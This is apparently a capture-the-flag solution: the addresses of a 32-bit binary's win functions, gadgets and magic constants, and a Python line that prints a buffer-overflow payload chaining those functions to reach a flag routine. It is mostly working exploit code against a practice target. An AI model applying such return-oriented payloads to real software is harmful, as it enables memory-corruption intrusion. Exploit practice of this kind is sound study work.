0xDEADBAAD
&flag 0x0804866f
0xBAAAAAAD
0x0804887a
&win_function2 0x080485fd
&win_function1 0x080485e6
28 bytes


buffer = 'A' * 28
win_function1 = '\xe6\x85\x04\x08'
win_function2 = '\xfd\x85\x04\x08'
pop_ret = '\x96\x88\x04\x08'
pop_pop_ret = '\x7a\x88\x04\x08'
bad = '\xAD\xAA\xAA\xBA'
flag = '\x6f\x86\x04\x08'
dead_bad = '\xAD\xBA\xAD\xDE'
print(buffer + win_function1 + win_function2 + pop_pop_ret + bad + dead_bad + flag + pop_ret + dead_bad)